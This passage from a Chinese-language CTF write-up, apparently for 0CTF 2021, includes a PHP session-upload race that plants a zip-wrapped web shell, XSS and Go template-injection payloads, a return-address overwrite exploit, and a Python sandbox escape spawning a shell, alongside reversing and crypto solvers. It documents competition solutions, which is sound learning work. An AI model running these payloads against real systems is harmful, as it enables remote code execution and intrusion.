?>''' % cmd

f = open('shell.php', 'w')
f.write(poc)
f.close()

os.system('rm -rf shell.zip;zip shell.zip shell.php')

f = open('shell.zip', 'rb')
ZipContent = f.read()
f.close()

central_directory_idx = ZipContent.index(b'\x50\x4B\x01\x02')
end_central_directory_idx = ZipContent.index(b'\x50\x4B\x05\x06')

# 文件开头
file_local_header = ZipContent[:central_directory_idx]
# 核心目录
central_directory = ZipContent[central_directory_idx:end_central_directory_idx]
# 结束
end_central_directory = ZipContent[end_central_directory_idx:]

def GetHeaderOffset():
    return u32(central_directory[42:46])

def SetHeaderOffset(offset):
    return central_directory[:42] + p32(offset) + central_directory[46:]

def GetArchiveOffset():
    return u32(end_central_directory[16:20])

def SetArchiveOffset(offset):
    return end_central_directory[:16] + p32(offset) + end_central_directory[20:]

def Create(start, end):
    length = len(start)
    HeaderOffset = SetHeaderOffset(length + GetHeaderOffset())
    ArchiveOffset = SetArchiveOffset(length + GetArchiveOffset())

    NewZipContent = file_local_header + HeaderOffset + ArchiveOffset

    return NewZipContent

start = b'upload_progress_'
end = b'|a:5:{s:10:"start_time";i:1625309087;s:14:"content_length";i:336;s:15:"bytes_processed";i:336;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:13:"callmecro.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1625309087;s:15:"bytes_processed";i:336;}}}'

ZipContent = Create(start, end)
f = open("shell.zip","wb")
f.write(ZipContent)
f.close()

sessid = 'callmecro'
url = 'http://111.186.59.2:50081/'

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 1024)
        r = session.post(url, data={'PHP_SESSION_UPLOAD_PROGRESS': ZipContent}, files={'file': ('callmecro.txt',f)}, cookies={'PHPSESSID': sessid})

def read(session):
    while True:
        r = session.post(url+'?yxxx=zip:///tmp/sess_'+sessid+'%23'+'shell', data={})
        if '@evoA yyds' in r.text:
            print(r.text.strip('@evoA yyds'))
            event.clear()
            sys.exit()


event=threading.Event()
with requests.session() as session:
    for i in range(30):
        threading.Thread(target=write,args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read,args=(session,)).start()
event.set()
```

### Worldcup

第一层：nikename= `'`+`，msg= `};alert(1)// 

```
set cookie: level1 NoQWeCy70QekDB5b
```

第二层：nickname= `'`};(`，msg= `);alert(1)// 

```
set cookie: level2 Autx5F53FmmSFayM
```

Golang text/template 的 SSTI：

`{{$}}` 可以看到所有变量

`?bet=<@urlencode>1{{if lt .o0ps_u_Do1nt_no_t1 .o0ps_u_Do1nt_no_t2}}{{.z "z"}}{{end}}<@/urlencode>` t1<t2的时候用不存在的 `{{.z "z"}}` 报错，这样猜错就不会扣钱了，猜对+10$

![img](./pngs/worldcup_exp.png)

## Reverse

### Vp

用fork实现的虚拟机 (todo)

```
x = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
     1, 1, 1, 1, 1, 1, 1, 1, 1, 1]

check_data  = [[0, 8, 2],
[0, 2, 3],
[0, 5, 4],
[0, 4, 2],
[0, 6, 1], # 6 down
[1, 0, 2],
[1, 3, 2],
[1, 1, 4],
[1, 7, 3],
[1, 9, 2],
[2, 3, 2],
[2, 4, 2],
[2, 9, 3],
[2, 7, 3],
[2, 2, 2],
[3, 1, 2],
[3, 6, 3],
[3, 5, 2],
[3, 0, 2],
[3, 8, 1]] # 89 left
idxs = []
cnt = 0
for d in check_data:
    choice = d[0]
    m = d[1]
    r = d[2]
    if choice == 2:
        step = 1
        idx = 10 * m
    elif choice == 3:
        step = -1
        idx = 10 * (m+1) -1
    elif choice == 0:
        step = 10
        idx = m
    elif choice == 1:
        step = -10
        idx = 10 * 9 + m
    print(step, idx)
    j = 0
    num = 0
    max = -1
    sum = 0
    while True:
        if j == 10:
            break
        c = x[idx]
        # print(c)
        assert 1<=c<=10
        num |= (1 << c-1)
        if c > max:
            max = c
            sum += 1
        else:
            idx += step
            j += 1
    # print(num, sum)
    # print(1023, r)
    if num == 1023: # 0b1111111111
        if sum == r:
            cnt += 1
print(cnt)
if cnt == 20:
    print("correct")
```

一种填字游戏

10*10的表，每一行为1-10，每一列为1-10

check某一行(或某一列)从左到右/从右到左(或从上到下/从下到上)最大值变化的次数为给定值

有点像数独



dfs搜索加剪枝

```
#include <cstdio>
#include <cstdlib>
#include <vector>
#include <algorithm>
#include <unordered_set>
using namespace std;

#define N 10

int check_row[N];
int check_col[N];

void init_check()
{
    const int check_data[2 * N][3] = {{0, 8, 2}, {0, 2, 3}, {0, 5, 4}, {0, 4, 2}, {0, 6, 1}, {1, 0, 2}, {1, 3, 2}, {1, 1, 4}, {1, 7, 3}, {1, 9, 2}, {2, 3, 2}, {2, 4, 2}, {2, 9, 3}, {2, 7, 3}, {2, 2, 2}, {3, 1, 2}, {3, 6, 3}, {3, 5, 2}, {3, 0, 2}, {3, 8, 1}};

    for (int i = 0; i < 2 * N; ++i)
    {
        int c = check_data[i][0];
        int m = check_data[i][1];
        int r = check_data[i][2];
        switch (c)
        {
        case 0:
            check_col[m] = r;
            break;
        case 1:
            check_col[m] = -r;
            break;
        case 2:
            check_row[m] = r;
            break;
        case 3:
            check_row[m] = -r;
            break;
        }
    }
}

vector<vector<int>> perms[N+1];

int count_max(const vector<int> &perm)
{
    int mx = -1;
    int cnt = 0;
    for (int x : perm)
        if (x > mx) {
            mx = x;
            cnt++;
        }
    return cnt;
}

vector<vector<int>> perms_row[N], perms_col[N];
unordered_set<int> avail_row[N], avail_col[N];

void init_perm()
{
    vector<int> perm{1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
    do
    {
        int c = count_max(perm);
        perms[c].push_back(perm);
    } while (next_permutation(perm.begin(), perm.end()));

    for (int i = 0; i < N; ++i) {
        if (check_row[i] > 0)
            perms_row[i] = perms[check_row[i]];
        else {
            for (vector<int> &vec : perms[-check_row[i]])
                perms_row[i].push_back(vector<int>(vec.rbegin(), vec.rend()));
        }
        for (size_t j = 0; j < perms_row[i].size(); ++j)
            avail_row[i].insert(j);
    }
    for (int i = 0; i < N; ++i) {
        if (check_col[i] > 0)
            perms_col[i] = perms[check_col[i]];
        else {
            for (vector<int> &vec : perms[-check_col[i]])
                perms_col[i].push_back(vector<int>(vec.rbegin(), vec.rend()));
        }
        for (size_t j = 0; j < perms_col[i].size(); ++j)
            avail_col[i].insert(j);
    }
}

int board[N][N];
bool done_row[N], done_col[N];

void finish()
{
    for (int i = 0; i < N; ++i) {
        for (int j = 0; j < N; ++j)
            printf("%d ", board[i][j]);
        printf("\n");
    }
    exit(0);
}

void dfs(int has_set)
{
    int row = -1;
    for (int i = 0; i < N; ++i)
        if (!done_row[i]) {
            if (row == -1 || avail_row[row].size() > avail_row[i].size())
                row = i;
        }
    if (row == -1)
        finish();
    int col = -1;
    for (int i = 0; i < N; ++i)
        if (!done_col[i]) {
            if (col == -1 || avail_row[col].size() > avail_col[i].size())
                col = i;
        }
    //printf("has %d\n", has_set);

    int save[N], new_set = has_set;

    if (avail_row[row].size() < avail_col[col].size()) {
        //printf("row %d\n", row);
        for (int i = 0; i < N; ++i)
            save[i] = board[row][i];
        for (int i = 0; i < N; ++i)
            if (save[i] == 0)
                new_set++;

        done_row[row] = true;
        for (int perm_idx: avail_row[row]) {
            const vector<int> &perm = perms_row[row][perm_idx];

            /* set board */
            for (int i = 0; i < N; ++i)
                board[row][i] = perm[i];

            /* mark unavailable perms */
            vector<int> ban_row[N], ban_col[N];
            for (int i = 0; i < N; ++i)
                if (!done_row[i]) {
                    for (int j: avail_row[i])
                        for (int k = 0; k < N; ++k)
                            if (perms_row[i][j][k] == board[row][k]) {
                                ban_row[i].push_back(j);
                                break;
                            }
                    for (int j: ban_row[i])
                        avail_row[i].erase(j);
                }
            for (int i = 0; i < N; ++i)
                if (!done_col[i]) {
                    for (int j: avail_col[i])
                        if (perms_col[i][j][row] != board[row][i])
                            ban_col[i].push_back(j);
                    for (int j: ban_col[i])
                        avail_col[i].erase(j);
                }

            dfs(new_set);

            /* revert available perms */
            for (int i = 0; i < N; ++i)
                for (int j: ban_row[i])
                    avail_row[i].insert(j);
            for (int i = 0; i < N; ++i)
                for (int j: ban_col[i])
                    avail_col[i].insert(j);

            /* revert board*/
            for (int i = 0; i < N; ++i)
                board[row][i] = save[i];
        }
        done_row[row] = false;
    }
    else {
        //printf("col %d\n", col);
        for (int i = 0; i < N; ++i)
            save[i] = board[i][col];
        for (int i = 0; i < N; ++i)
            if (save[i] == 0)
                new_set++;

        done_col[col] = true;
        for (int perm_idx: avail_col[col]) {
            const vector<int> &perm = perms_col[col][perm_idx];

            /* set board */
            for (int i = 0; i < N; ++i)
                board[i][col] = perm[i];

            /* mark unavailable perms */
            vector<int> ban_row[N], ban_col[N];
            for (int i = 0; i < N; ++i)
                if (!done_col[i]) {
                    for (int j: avail_col[i])
                        for (int k = 0; k < N; ++k)
                            if (perms_col[i][j][k] == board[k][col]) {
                                ban_col[i].push_back(j);
                                break;
                            }
                    for (int j: ban_col[i])
                        avail_col[i].erase(j);
                }
            for (int i = 0; i < N; ++i)
                if (!done_row[i]) {
                    for (int j: avail_row[i])
                        if (perms_row[i][j][col] != board[i][col])
                            ban_row[i].push_back(j);
                    for (int j: ban_row[i])
                        avail_row[i].erase(j);
                }

            dfs(new_set);

            /* revert available perms */
            for (int i = 0; i < N; ++i)
                for (int j: ban_row[i])
                    avail_row[i].insert(j);
            for (int i = 0; i < N; ++i)
                for (int j: ban_col[i])
                    avail_col[i].insert(j);

            /* revert board*/
            for (int i = 0; i < N; ++i)
                board[i][col] = save[i];
        }
        done_col[col] = false;
    }
}

int main()
{
    init_check();
    init_perm();
    dfs(0);
    return 0;
}
x = [9,8,4,5,3,2,10,1,6,7,
2,7,8,3,1,5,9,4,10,6,
4,3,1,2,10,9,8,6,7,5,
5,10,7,9,4,3,6,2,8,1,
7,6,10,8,2,1,4,9,5,3,
3,1,2,6,7,8,5,10,4,9,
10,9,5,1,6,4,2,7,3,8,
6,5,9,10,8,7,1,3,2,4,
1,2,3,4,5,6,7,8,9,10,
8,4,6,7,9,10,3,5,1,2,
]
```

算对结束后有个写地址的功能，可以写code+0x10000内的两个字节，后门函数就是读flag （后门sub_CC8）

![img](./pngs/vp.png)

调试一下发现返回地址和数据的偏移为39312。需要爆破1/16后门地址。多试几次就出来了

```
from pwn import *
x = [9,8,4,5,3,2,10,1,6,7,
2,7,8,3,1,5,9,4,10,6,
4,3,1,2,10,9,8,6,7,5,
5,10,7,9,4,3,6,2,8,1,
7,6,10,8,2,1,4,9,5,3,
3,1,2,6,7,8,5,10,4,9,
10,9,5,1,6,4,2,7,3,8,
6,5,9,10,8,7,1,3,2,4,
1,2,3,4,5,6,7,8,9,10,
8,4,6,7,9,10,3,5,1,2,
]
x = bytes(x)+b"\xc8\x4c\x08\x80"
# p = process("./vp")
p = remote("111.186.59.32","20217")
p.send(x)
print(p.recvall())
```

### FEA

远程会发题目，需要逆题目并且求解。一共需要过 3 次，每次都需要在 10 秒内解决，题目的结构差不多，都是反调试（0xcc检测、cmdline 检测）、释放代码、跑释放出来的代码。

释放出来的代码结构也差不多，对input做一个运算，然后和一个超大函数运算的结果比较。

中途还碰到了好多问题：

1. 那个大函数最开始不知道不需要逆……
2. Angr 跑check函数发生了诡异的问题，提了个 issue [Unexpected behavior when executing a single function · Issue #2800 · angr/angr (github.com)](https://github.com/angr/angr/issues/2800) 不知道是不是我代码写错了
3. 最后的调试里边，有 0xcc 需要去掉，否则会不停把 gdb 断下来。去的时候我直接搜 0xcc 给去了，可能导致函数出了点问题，但是好像并不是每次都会有问题，大概会有 1/4 - 1/5 左右的概率有问题
4. z3

思路：过反调，gdb调试，获取到超大函数结果，z3 求解即可。

```
from pwn import *
import base64
from hashlib import sha256
import subprocess
from time import sleep

context(log_level='debug')
p = remote("111.186.58.164", "30212")
a, res = p.recvline().split(b" == ")
res = res.strip()
question = a.split(b")")[0].split(b"+")[1]

tbl = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456790"
def solve(question, res):
    for i in tbl:
        for j in tbl:
            for k in tbl:
                for l in tbl:
                    ans = bytes([i,j,k,l])
                    r = ans+question
                    # print(sha256(r).hexdigest().encode())
                    # print(res)
                    if sha256(r).hexdigest().encode() == res:
                        return ans
ans = solve(question, res)
print(ans)
p.sendline(ans)

for i in range(3):
    p.recvuntil("Here is your challenge:\n\n")
    chall = p.recvline()
    print(len(chall))
    print(ans)
    name = 'chall_' + ans.decode()
    open(name, "wb").write(base64.b64decode(chall))

    res = subprocess.Popen(['gdb', name], stdin=subprocess.PIPE) 
    res.stdin.write(b'\nsource fuck.py\na\n\nquit\n')
    res.stdin.flush()
    sleep(5)
    res.kill()
    print(name)

    #input()

    with open('result.txt', 'rb') as f:
        #final_ans = int.to_bytes(int(f.read()), 8, 'little')
        final_ans = f.read()
    p.send(final_ans)

p.interactive() 
```

z3求解：

```
import gdb
from z3 import *

gdb.execute('b *0x401135')

gdb.execute('b *0x4013d7')
gdb.execute('r')
gdb.execute('set $rip=0x4013ea')

gdb.execute('set *(char*)(0x4014e0)=0xc3')
gdb.execute('set *(char*)(0x400be0)=0x48')
gdb.execute('set *(char*)(0x400be0+1)=0x31')
gdb.execute('set *(char*)(0x400be0+2)=0xc0')
gdb.execute('set *(char*)(0x400be0+3)=0xc3')


gdb.execute('set *(char*)(0x4012a7+7)=0x1')

gdb.execute('c')
gdb.execute('ni')

addr = int(gdb.parse_and_eval('$rax'))
print(hex(addr))

gdb.execute('b *0x401329')
gdb.execute('c')
gdb.execute('ni')

gdb.execute('dump binary memory image {} {}+0x30000'.format(addr, addr))

with open('image', 'rb') as f:
    image = bytearray(f.read())

for i in range(0x30000):
    #v = int(gdb.parse_and_eval('*(char*)({})'.format(addr + i))) & 0xff
    if image[i] == 0xcc:
        #gdb.execute('set *(char*)({}) = 0x90'.format(addr + i))
        image[i] = 0x90

with open('image', 'wb') as f:
    f.write(image)

gdb.execute('restore image binary {} 0'.format(addr))

gdb.execute('b *({}+*((long*)0x6060c0)+0x7a)'.format(addr))

#gdb.execute('b *({}+*((long*)0x6060c0)+0x7a-0x24)'.format(addr))

gdb.execute('c')

ans_ptr = int(gdb.parse_and_eval('$rdi'))
print(hex(ans_ptr))
gdb.execute('ni')
ans_0 = int(gdb.parse_and_eval('*(unsigned int*){}'.format(ans_ptr)))
ans_1 = int(gdb.parse_and_eval('*(unsigned int*)({}+4)'.format(ans_ptr)))

with open('ans.txt', 'w') as f:
    f.write(hex(ans_0))
    f.write('\n')
    f.write(hex(ans_1))

def fuck(ans_0, ans_1, p_0, p_1):
    #p_0 = 0x8861e08f
    #p_1 = 0x7a867251
    #p_0 = 0x27dbd098
    #p_1 = 0x8c3d97df

    v1 = p_0 >> 0x10
    v2 = v1 * 7
    v2 &= 0xffffffff

    v2 = (v2 & 0xffff) - (v2 >> 0x10)
    v2 &= 0xffffffff
    v2 = v2 - (v2 >> 0x10)
    v2 &= 0xffffffff

    v3 = p_0 + 6
    v3 &= 0xffffffff
    v4 = (p_1 >> 0x10) + 5
    v4 &= 0xffffffff
    v5 = p_1 & 0xffff
    v1 = v5 * 4
    v1 &= 0xffffffff

    v1 = (v1 & 0xffff) - (v1 >> 0x10)
    v1 = v1 - (v1 >> 0x10)

    v6 = (v4 ^ v2) & 0xffff
    v5 = v6 * 3
    v5 &= 0xffffffff

    v5 = (v5 & 0xffff) - (v5 >> 0x10)
    v7 = v5 - (v5 >> 0x10)

    v6 = (v3 ^ v1) + v7 & 0xffff
    v6 &= 0xffffffff
    v5 = v6 * 2
    v5 &= 0xffffffff

    v5 = (v5 & 0xffff) - (v5 >> 0x10)
    v5 = v5 - (v5 >> 0x10)
    print(hex(p_0), hex(p_1), ans_0, ans_1, ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff, (((v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10) & 0xffffffff))
    if ((v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff) & 0xffffffff != ans_0:
        return False

    if (((v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10) & 0xffffffff) != ans_1:
        return False

    return True

def mysolve(ans_0, ans_1):
    p_0 = BitVec('p0', 32)
    p_1 = BitVec('p1', 32)

    #p_0 = 0x8861e08f
    #p_1 = 0x7a867251
    #p_0 = 0x27dbd098
    #p_1 = 0x8c3d97df

    v1 = p_0 >> 0x10
    v2 = v1 * 7

    v2 = (v2 & 0xffff) - (v2 >> 0x10)
    v2 = v2 - (v2 >> 0x10)

    v3 = p_0 + 6
    v4 = (p_1 >> 0x10) + 5
    v5 = p_1 & 0xffff
    v1 = v5 * 4

    v1 = (v1 & 0xffff) - (v1 >> 0x10)
    v1 = v1 - (v1 >> 0x10)

    v6 = (v4 ^ v2) & 0xffff
    v5 = v6 * 3

    v5 = (v5 & 0xffff) - (v5 >> 0x10)
    v7 = v5 - (v5 >> 0x10)

    v6 = (v3 ^ v1) + v7 & 0xffff
    v5 = v6 * 2

    v5 = (v5 & 0xffff) - (v5 >> 0x10)
    v5 = v5 - (v5 >> 0x10)

    s = Solver()

    s.add(

        (v2 ^ v5) << 0x10 | (v5 ^ v4) & 0xffff == ans_0,
        (v1 ^ v7 + v5) & 0xffff | (v3 ^ v7 + v5) << 0x10 == ans_1
    )

    if s.check() == sat:
        m = s.model()

        print(m[p_0])
        print(m[p_1])
        p_0 = int(m[p_0].as_long())
        p_1 = int(m[p_1].as_long())

        #print(hex(p_0 + 0x10000 + (p_1 << 32)))
        #enc(p_0 + 0x10000 + (p_1 << 32))

        if not fuck(ans_0, ans_1, p_0, p_1):
            if fuck(ans_0, ans_1, p_0 + 0x100, p_1):
                p_0 += 0x100
            elif fuck(ans_0, ans_1, p_0 + 0x10000, p_1):
                p_0 += 0x10000
            elif fuck(ans_0, ans_1, p_0 + 0x10100, p_1):
                p_0 += 0x10100
            else:
                raise Exception('fuck!!')


        res = int.to_bytes(p_0, 4, 'little') + int.to_bytes(p_1, 4, 'little')
        with open('result.txt', 'wb') as f:
            f.write(res)
    else:
        raise Exception('fuck!')

    #print((c1, c2))

mysolve(ans_0, ans_1)
```

比较神奇的是，不知道为啥，我的z3求解总是有可能出现几个错，然后发现只会错 0x100 0x10000 和 0x10100 ，我也不知道为啥。反正最后决定暴力跑一遍谁对了算谁。

但是即使如此依然还可能会错，大概有个 1/4 1/5 的概率是不对的，调了一下，应该是反调直接去 0xcc 有点过分。

但是可能我欧皇了，反正这样过了。

## Crypto

### Checkin

简单的计算题，用python写了一个太慢了，换C语言就可以了

```
#include <gmp.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv)
{
        int m = atoi(argv[1]);
        const char *mod_s = argv[2];
        mpz_t mod, x;
        mpz_init_set_str(mod, mod_s, 10);
        mpz_init_set_ui(x, 2);
        for (int i = 0; i < m; ++i) {
                mpz_mul(x, x, x);
                mpz_mod(x, x, mod);
        }
        mpz_out_str(stdout, 10, x);
        return 0;
}
```

### zer0lfsr-

参考了前年zer0lfsr的wp: https://fireshellsecurity.team/0ctf-zer0lfsr/

发现可以用z3直接解。然后改了一下n2l就过了

```
from pwn import *
import hashlib
import random
from z3 import *

#---------------------original code---------------------#
def _prod(L):
    p = 1
    for x in L:
        p *= x
    return p

def _sum(L):
    s = 0
    for x in L:
        s ^= x
    return s

def n2l_0(x, l):
    return list(map(int, '{{0:0{}b}}'.format(l).format(x)))
def n2l(x,l):
    ans=[]
    for i in range(l):
        ans.append(x&1)
        x=x>>1
    return ans[::-1]

x = 12387192379
l = 64
assert n2l_0(x,l) == n2l(x,l)

    
class Generator1:
    def __init__(self, key: list):
        assert len(key) == 64
        self.NFSR = key[: 48]
        self.LFSR = key[48: ]
        self.TAP = [0, 1, 12, 15]
        self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]]
        self.h_IN = [2, 4, 7, 15, 27]
        self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]]

    def g(self):
        x = self.NFSR
        return _sum(_prod(x[i] for i in j) for j in self.TAP2)

    def h(self):
        x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]]
        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)

    def f(self):
        return _sum([self.NFSR[0], self.h()])

    def clock(self):
        o = self.f()
        self.NFSR = self.NFSR[1: ] + [self.LFSR[0] ^ self.g()]
        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]
        return o

class Generator2:
    def __init__(self, key):
        assert len(key) == 64
        self.NFSR = key[: 16]
        self.LFSR = key[16: ]
        self.TAP = [0, 35]
        self.f_IN = [0, 10, 20, 30, 40, 47]
        self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [
            0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]]
        self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]]
        self.h_IN = [0, 2, 4, 6, 8, 13, 14]
        self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]]

    def f(self):
        x = [self.LFSR[i] for i in self.f_IN]
        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)
 
    def h(self):
        x = [self.NFSR[i] for i in self.h_IN]
        return _sum(_prod(x[i] for i in j) for j in self.h_OUT)        

    def g(self):
        x = self.NFSR
        return _sum(_prod(x[i] for i in j) for j in self.TAP2)  

    def clock(self):
        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]
        self.NFSR = self.NFSR[1: ] + [self.LFSR[1] ^ self.g()]
        return self.f() ^ self.h()

class Generator3:
    def __init__(self, key: list):
        assert len(key) == 64
        self.LFSR = key
        self.TAP = [0, 55]
        self.f_IN = [0, 8, 16, 24, 32, 40, 63]
        self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]]

    def f(self):
        x = [self.LFSR[i] for i in self.f_IN]
        return _sum(_prod(x[i] for i in j) for j in self.f_OUT)

    def clock(self):
        self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)]
        return self.f()

class zer0lfsr:
    def __init__(self, msk: int, t: int):
        if t == 1:
            self.g = Generator1(n2l(msk, 64))
        elif t == 2:
            self.g = Generator2(n2l(msk, 64))
        else:
            self.g = Generator3(n2l(msk, 64))
        self.t = t

    def next(self):
        for i in range(self.t):
            o = self.g.clock()
        return o
#---------------------original code end---------------------#


#----------------------------------pow------------------------------------------#
alphabet = string.ascii_letters + string.digits + '!#$%&*-?'
#print(alphabet)
host,port = "111.186.59.28",31337
context.log_level = "debug"
r = remote(host,port)
r.recvuntil(" + ")
suffix = str(r.recvuntil(")"))[2:-2]
r.recvuntil(" == ")
result = str(r.recvuntil("\n"))[2:-3]
print(result)
pow = ""
while True:
    prefix = "".join(random.choices(alphabet,k=4))
    # print(prefix)
    # print(prefix+suffix)
    #print(hashlib.sha256((prefix+suffix).encode()).hexdigest())
    if hashlib.sha256((prefix+suffix).encode()).hexdigest()==result:
        pow = prefix
        break
r.sendline(pow)
#---------------------------pow  end------------------------------------------#

#------------------try generator i-------------------------#
for i in [1,3]:
    r.recvuntil("one:")
    r.sendline(str(i))
    s = Solver()
    msk = BitVec('msk',64)
    r.recvuntil("start:::")
    keystream = r.recvuntil(":::end").decode('latin-1')
    print(keystream[-6:])
    keystream = keystream[:-6]
    print(len(keystream))
    lfsr = zer0lfsr(msk, i)
    lfsr_bits = []
    for i in range(1000):
        c = ord(keystream[i])
        temp_list = []
        for j in range(8):
            temp_list.append(c&1)
            c >>= 1
        temp_list = temp_list[::-1]
        lfsr_bits += temp_list
    print(len(lfsr_bits))
    for i in range(200):
        s.add(lfsr_bits[i] == lfsr.next())
        #print(i)
    print("add finished")
    print(s.check())
    #assert s.check()==sat
    msk = s.model()[msk]
    print(msk)
    r.recvuntil("hint: ")
    hint = r.recvuntil("\n").decode()[:-1]
    assert hashlib.sha256(str(msk).encode()).hexdigest()
    r.recvuntil("k:")
    r.sendline(str(msk))
r.interactive()  

        
```

## Misc

### uc_baaaby 

用 0x233 条指令计算md5

可能unicorn有一些trick绕过指令计数？

代码只能有一个block

```
#include <inttypes.h>
#include <stdio.h>

static const uint32_t s[64] = {
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
    5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};

static const uint32_t K[64] = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391};

__attribute__((always_inline))
inline uint32_t left_rotate(uint32_t x, uint32_t c)
{
    return (x << c) | (x >> (32 - c));
}

//void md5(char data[50], char out[16])
void md5()
{
    const char *data = (void*)0xbabecafe000;
    const char *out = data + 0x800;
    uint32_t a0 = 0x67452301;
    uint32_t b0 = 0xefcdab89;
    uint32_t c0 = 0x98badcfe;
    uint32_t d0 = 0x10325476;
    uint32_t M[16] = {
        *(uint32_t *)(data + 4 * 0),
        *(uint32_t *)(data + 4 * 1),
        *(uint32_t *)(data + 4 * 2),
        *(uint32_t *)(data + 4 * 3),
        *(uint32_t *)(data + 4 * 4),
        *(uint32_t *)(data + 4 * 5),
        *(uint32_t *)(data + 4 * 6),
        *(uint32_t *)(data + 4 * 7),
        *(uint32_t *)(data + 4 * 8),
        *(uint32_t *)(data + 4 * 9),
        *(uint32_t *)(data + 4 * 10),
        *(uint32_t *)(data + 4 * 11),
        *(uint16_t *)(data + 4 * 12) + (1 << 23),
        0,
        400,
        0,
    };
    uint32_t A = a0, B = b0, C = c0, D = d0;
    uint32_t F, g;

#define WORK0()                       \
    {                                 \
        F = F + A + K[i] + M[g];      \
        A = D;                        \
        D = C;                        \
        C = B;                        \
        B = B + left_rotate(F, s[i]); \
    }

#define WORK1(i)                \
    {                           \
        F = (B & C) | (~B & D); \
        g = i;                  \
        WORK0();                \
    }

#define WORK2(i)                \
    {                           \
        F = (D & B) | (~D & C); \
        g = (5 * i + 1) % 16;   \
        WORK0();                \
    }

#define WORK3(i)              \
    {                         \
        F = B ^ C ^ D;        \
        g = (3 * i + 5) % 16; \
        WORK0();              \
    }

#define WORK4(i)          \
    {                     \
        F = C ^ (B | ~D); \
        g = (7 * i) % 16; \
        WORK0();          \
    }

    for (int i = 0; i < 16; ++i)
        WORK1(i);
    for (int i = 16; i < 32; ++i)
        WORK2(i);
    for (int i = 32; i < 48; ++i)
        WORK3(i);
    for (int i = 48; i < 64; ++i)
        WORK4(i);

    a0 = a0 + A;
    b0 = b0 + B;
    c0 = c0 + C;
    d0 = d0 + D;
    *(uint32_t *)(out + 0) = a0;
    *(uint32_t *)(out + 4) = b0;
    *(uint32_t *)(out + 8) = c0;
    *(uint32_t *)(out + 12) = d0;
}
```

gcc -O3 编译到汇编，自动循环展开

汇编前面加一句设置 rsp



必须走到 CODE+0x2000 才算 finished...

![img](./pngs/baby.png)

最后加个这个6666前缀的指令走到0x2000



### pypypypy 

参考 https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#python3

```
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('sh')
```

Gift: __class__,  __dict__

```
sub = ''.__class__.__base__.__subclasses__()
